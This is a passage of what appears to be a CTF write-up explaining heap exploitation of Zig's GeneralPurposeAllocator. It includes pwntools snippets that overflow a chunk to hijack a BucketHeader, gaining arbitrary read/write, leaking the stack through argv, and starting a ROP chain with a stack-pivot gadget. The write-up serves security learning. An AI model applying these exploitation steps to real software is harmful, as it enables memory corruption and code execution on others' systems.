//! size class is not allocated. When the first object is allocated for a given
//! size class, it allocates 1 page of memory from the OS. This page is
//! divided into &quot;slots&quot; - one per allocated object. Along with the page of memory
//! for object slots, as many pages as necessary are allocated to store the
//! BucketHeader, followed by &quot;used bits&quot;, and two stack traces for each slot
//! (allocation trace and free trace).
//!
//! The &quot;used bits&quot; are 1 bit per slot representing whether the slot is used.
//! Allocations use the data to iterate to find a free slot. Frees assert that the
//! corresponding bit is 1 and set it to 0.
//!
//! Buckets have prev and next pointers. When there is only one bucket for a given
//! size class, both prev and next point to itself. When all slots of a bucket are
//! used, a new bucket is allocated, and enters the doubly linked list. The main
//! allocator state tracks the &quot;current&quot; bucket for each size class. Leak detection
//! currently only checks the current bucket.
//!
//! Resizing detects if the size class is unchanged or smaller, in which case the same
//! pointer is returned unmodified. If a larger size class is required,
//! `error.OutOfMemory` is returned.
//!
//! Large objects are allocated directly using the backing allocator and their metadata is stored
//! in a `std.HashMap` using the backing allocator.
</code></pre><p>Let&rsquo;s take a look at <code>alloc</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">alloc</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">len</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">ptr_align</span>: <span class="nc">u29</span><span class="p">,</span><span class="w"> </span><span class="n">len_align</span>: <span class="nc">u29</span><span class="p">,</span><span class="w"> </span><span class="n">ret_addr</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!</span><span class="p">[]</span><span class="kt">u8</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="bp">self</span><span class="p">.</span><span class="n">mutex</span><span class="p">.</span><span class="n">lock</span><span class="p">();</span><span class="w">
</span><span class="w">    </span><span class="n">defer</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">mutex</span><span class="p">.</span><span class="n">unlock</span><span class="p">();</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="bp">self</span><span class="p">.</span><span class="n">isAllocationAllowed</span><span class="p">(</span><span class="n">len</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">error</span><span class="p">.</span><span class="n">OutOfMemory</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">new_aligned_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="n">max</span><span class="p">(</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">ptr_align</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">new_aligned_size</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">largest_bucket_object_size</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">large_allocations</span><span class="p">.</span><span class="n">ensureUnusedCapacity</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="n">slice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">rawAlloc</span><span class="p">(</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">ptr_align</span><span class="p">,</span><span class="w"> </span><span class="n">len_align</span><span class="p">,</span><span class="w"> </span><span class="n">ret_addr</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="n">gop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">large_allocations</span><span class="p">.</span><span class="n">getOrPutAssumeCapacity</span><span class="p">(</span><span class="o">@</span><span class="n">ptrToInt</span><span class="p">(</span><span class="n">slice</span><span class="p">.</span><span class="n">ptr</span><span class="p">));</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">retain_metadata</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="o">!</span><span class="n">config</span><span class="p">.</span><span class="n">never_unmap</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="c1">// Backing allocator may be reusing memory that we&#39;re retaining metadata for
</span><span class="c1"></span><span class="w">            </span><span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">gop</span><span class="p">.</span><span class="n">found_existing</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">freed</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">gop</span><span class="p">.</span><span class="n">found_existing</span><span class="p">);</span><span class="w"> </span><span class="c1">// This would mean the kernel double-mapped pages.
</span><span class="c1"></span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">        </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">slice</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">enable_memory_limit</span><span class="p">)</span><span class="w">
</span><span class="w">            </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">requested_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">len</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">captureStackTrace</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">alloc</span><span class="p">);</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">retain_metadata</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">freed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">never_unmap</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">                </span><span class="n">gop</span><span class="p">.</span><span class="n">value_ptr</span><span class="p">.</span><span class="n">ptr_align</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_align</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="p">}</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">verbose_log</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#34;large alloc {d} bytes at {*}&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{</span><span class="w"> </span><span class="n">slice</span><span class="p">.</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">slice</span><span class="p">.</span><span class="n">ptr</span><span class="w"> </span><span class="p">});</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">slice</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">new_size_class</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="n">ceilPowerOfTwoAssert</span><span class="p">(</span><span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">new_aligned_size</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">allocSlot</span><span class="p">(</span><span class="n">new_size_class</span><span class="p">,</span><span class="w"> </span><span class="n">ret_addr</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="n">verbose_log</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">&#34;small alloc {d} bytes at {*}&#34;</span><span class="p">,</span><span class="w"> </span><span class="p">.{</span><span class="w"> </span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">});</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ptr</span><span class="p">[</span><span class="mi">0</span><span class="o">..</span><span class="n">len</span><span class="p">];</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p>First in <code>alloc</code>, if the aligned size is not larger than the largest bucket capacity (2**11) it will call <code>allocSlot</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">allocSlot</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">trace_addr</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="kt">u8</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">bucket_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">math</span><span class="p">.</span><span class="n">log2</span><span class="p">(</span><span class="n">size_class</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">first_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">buckets</span><span class="p">[</span><span class="n">bucket_index</span><span class="p">]</span><span class="w"> </span><span class="n">orelse</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">createBucket</span><span class="p">(</span><span class="w">
</span><span class="w">        </span><span class="n">size_class</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="n">bucket_index</span><span class="p">,</span><span class="w">
</span><span class="w">    </span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">first_bucket</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">slot_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">divExact</span><span class="p">(</span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">bucket</span><span class="p">.</span><span class="n">alloc_cursor</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">slot_count</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="n">prev_bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_bucket</span><span class="p">.</span><span class="n">next</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bucket</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">first_bucket</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">            </span><span class="c1">// make a new one
</span><span class="c1"></span><span class="w">            </span><span class="n">bucket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">createBucket</span><span class="p">(</span><span class="n">size_class</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_index</span><span class="p">);</span><span class="w">
</span><span class="w">            </span><span class="n">bucket</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_bucket</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="n">bucket</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prev_bucket</span><span class="p">.</span><span class="n">next</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="n">prev_bucket</span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">            </span><span class="n">bucket</span><span class="p">.</span><span class="n">next</span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">        </span><span class="p">}</span><span class="w">
</span><span class="w">    </span><span class="p">}</span><span class="w">
</span><span class="w">    </span><span class="c1">// change the allocator&#39;s current bucket to be this one
</span><span class="c1"></span><span class="w">    </span><span class="bp">self</span><span class="p">.</span><span class="n">buckets</span><span class="p">[</span><span class="n">bucket_index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">alloc_cursor</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">bucket</span><span class="p">.</span><span class="n">alloc_cursor</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="n">var</span><span class="w"> </span><span class="n">used_bits_byte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">usedBits</span><span class="p">(</span><span class="n">slot_index</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">used_bit_index</span>: <span class="nc">u3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">intCast</span><span class="p">(</span><span class="n">u3</span><span class="p">,</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"> </span><span class="c1">// TODO cast should be unnecessary
</span><span class="c1"></span><span class="w">    </span><span class="n">used_bits_byte</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="p">(</span><span class="o">@</span><span class="k">as</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;&lt;</span><span class="w"> </span><span class="n">used_bit_index</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">bucket</span><span class="p">.</span><span class="n">used_count</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="n">bucket</span><span class="p">.</span><span class="n">captureStackTrace</span><span class="p">(</span><span class="n">trace_addr</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span><span class="p">,</span><span class="w"> </span><span class="n">slot_index</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">alloc</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bucket</span><span class="p">.</span><span class="n">page</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">slot_index</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">size_class</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p><code>allocSlot</code> will check if the current bucket is able to allocate one more object, else it will iterate through the doubly linked list to look for a not full bucket.
And if it does nto find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at <code>bucket.page + slot_index * size_class</code>.</p>
<p>As you can see, the <code>BucketHeader</code> is structured like below in the <code>createBucket</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-rust" data-lang="rust"><span class="k">fn</span> <span class="nf">createBucket</span><span class="p">(</span><span class="bp">self</span>: <span class="o">*</span><span class="bp">Self</span><span class="p">,</span><span class="w"> </span><span class="n">size_class</span>: <span class="kt">usize</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_index</span>: <span class="kt">usize</span><span class="p">)</span><span class="w"> </span><span class="n">Error</span><span class="o">!*</span><span class="n">BucketHeader</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">allocAdvanced</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="n">page_size</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">exact</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">errdefer</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">free</span><span class="p">(</span><span class="n">page</span><span class="p">);</span><span class="w">
</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">bucket_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bucketSize</span><span class="p">(</span><span class="n">size_class</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">bucket_bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kr">try</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">backing_allocator</span><span class="p">.</span><span class="n">allocAdvanced</span><span class="p">(</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="o">@</span><span class="n">alignOf</span><span class="p">(</span><span class="n">BucketHeader</span><span class="p">),</span><span class="w"> </span><span class="n">bucket_size</span><span class="p">,</span><span class="w"> </span><span class="p">.</span><span class="n">exact</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">@</span><span class="n">ptrCast</span><span class="p">(</span><span class="o">*</span><span class="n">BucketHeader</span><span class="p">,</span><span class="w"> </span><span class="n">bucket_bytes</span><span class="p">.</span><span class="n">ptr</span><span class="p">);</span><span class="w">
</span><span class="w">    </span><span class="n">ptr</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BucketHeader</span><span class="p">{</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">prev</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">.</span><span class="n">ptr</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">alloc_cursor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
</span><span class="w">        </span><span class="p">.</span><span class="n">used_count</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
</span><span class="w">    </span><span class="p">};</span><span class="w">
</span><span class="w">    </span><span class="bp">self</span><span class="p">.</span><span class="n">buckets</span><span class="p">[</span><span class="n">bucket_index</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span><span class="w">
</span><span class="w">    </span><span class="c1">// Set the used bits to all zeroes
</span><span class="c1"></span><span class="w">    </span><span class="o">@</span><span class="n">memset</span><span class="p">(</span><span class="o">@</span><span class="k">as</span><span class="p">(</span><span class="o">*</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="kt">u8</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">.</span><span class="n">usedBits</span><span class="p">(</span><span class="mi">0</span><span class="p">)),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">usedBitsCount</span><span class="p">(</span><span class="n">size_class</span><span class="p">));</span><span class="w">
</span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span><span class="w">
</span><span class="w"></span><span class="p">}</span><span class="w">
</span></code></pre></div><p>It allocates a page to store objects in, then it allocates the <code>BucketHeader</code> itself. Note that the page allocator will make allocations adjacent from each other. According to my several experiments the allocations grow &ndash; from an initial given mapping &ndash; to lower or higher addresses. I advice you to try different order of allocations in gdb to figure out this.</p>
<p>Let&rsquo;s quickly decribe each field of the <code>BucketHeader</code>:</p>
<ul>
<li><code>.prev</code> and <code>.next</code> keep track of the doubly linked list that links buckets of same size.</li>
<li><code>.page</code> contains the base address of the page that contains the objects that belong to the bucket.</li>
<li><code>alloc_cursor</code> contains the number of allocated objects.</li>
<li><code>used_count</code> contains the number of currently used objects.</li>
</ul>
<div class="gblog-post__anchorwrap">
    <h2 id="getting-read--write-what-were-primitive">
        Getting read / write what were primitive
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#getting-read--write-what-were-primitive" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Getting read / write what were primitive" href="#getting-read--write-what-were-primitive">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Well, the goal is to an arbitrary read / write by hiijacking the <code>.page</code> and <code>.alloc_cursor</code> fields of the <code>BucketHeader</code>, this way if we hiijack pointers from a currently used bucket for a given size we can get a chunk toward any location.</p>
<p>What we can do to get a chunk close to a  <code>BucketHeader</code> structure would be:</p>
<ul>
<li>Allocate large (<code>0x500-1</code>) chunk, <code>0x800</code> bucket.</li>
<li>Allocate 4 other chunks of size <code>1000</code>, which end up in the <code>0x400</code> bucket.</li>
</ul>
<p>Thus, first one page has been allocated to satisfy request one, then another page right after the other has been allocated to store the <code>BucketHeader</code> for this bucket.
Then, to satisfy the four next allocations, the page that stores the objects has been allocated right after the one which stores the <code>BucketHeader</code> of the <code>0x800</code>-bucket, and finally a page is allocated to store the <code>BucketHeader</code> of the <code>0x400</code> bucket.</p>
<p>If you do not understand clearly, I advice you to debug my exploit in <code>gdb</code> by looking at the <code>chunklist</code>.</p>
<p>With this process the last allocated <code>0x400</code>-sized chunk gets allocated <code>0x400</code> bytes before the <code>BucketHeader</code> of the bucket that handles <code>0x400</code>-sized chunks.
Thus to get a read / write what were we can simply trigger the heap overflow with the <code>edit</code> function to null out <code>.alloc_cursor</code> and <code>.used_count</code> and replace <code>.page</code> by the target location.
This way the next allocation that will request <code>0x400</code> bytes, which will trigger the hiijacked bucket and return the target location giving us the primitive.</p>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;vv&#34;</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x400</span> <span class="o">+</span> <span class="mi">5</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="mh">0x400</span> \ <span class="c1"># padding</span>
     <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x208000</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> \ <span class="c1"># next / prev + .page point toward the target =&gt; 0x208000</span>
     <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span> \ <span class="c1"># .alloc_cursor &amp; .used_count</span>
     <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span> <span class="c1"># used bits</span>

<span class="c1"># next alloc(1000) will trigger the write what were</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="leak-stack">
        Leak stack
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#leak-stack" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Leak stack" href="#leak-stack">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To leak the stack I leaked the <code>argv</code> variable that contains a pointer toward arguments given to the program, stored on the stack. That&rsquo;s a reliable leak given it&rsquo;s a known and fixed location, which can base used as a base compared with function&rsquo;s stackframes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1"># get chunk into target location (0x208000)</span>
<span class="n">show</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># argv is located at 0x208000 + 0x100</span>

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="rop">
        ROP
        <a data-clipboard-text="https://nasm.re/posts/zigzag/#rop" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROP" href="#rop">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we&rsquo;re able to overwrite whatever function&rsquo;s stackframe, we have to find one that returns from context of <code>std.fs.file.File.read</code> that reads the user input to the chunk. But unlucky functions like <code>add</code>, <code>edit</code> are inlined in the <code>main</code> function. Moreover we cannot overwrite the return address of the <code>main</code> function given that the exit handler call directly exit. Which means we have to corrput the stackframe of the <code>std.fs.file.File.read</code> function called in the <code>edit</code> function.
But the issue is that between the call to <code>SYS_read</code> within <code>std.fs.file.File.read</code> and the end of the function, variables that belong to the calling function&rsquo;s stackframe are edited, corrupting the ROPchain. So what I did is using this gadget to reach a part of the stack that will not be corrupted:</p>
<pre tabindex="0"><code>0x0000000000203715 : add rsp, 0x68 ; pop rbx ; pop r14 ; ret
</code></pre><p>With the use of this gadget I&rsquo;m able to pop a few QWORD from the stack to reach another area of the stack where I write my ROPchain.
